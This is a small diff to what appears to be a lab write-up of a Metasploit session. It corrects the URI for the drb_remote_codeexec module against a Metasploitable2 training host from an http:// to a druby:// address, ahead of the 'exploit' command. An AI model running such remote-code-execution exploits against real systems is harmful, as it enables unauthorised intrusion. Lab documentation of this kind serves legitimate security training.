@@ -93,7 +93,7 @@ Exploit target:
    0   Automatic
 
 
-msf exploit(drb_remote_codeexec) > set URI http://metasploitable2:8787
+msf exploit(drb_remote_codeexec) > set URI druby://metasploitable2:8787
 msf exploit(drb_remote_codeexec) > exploit
 ...
 
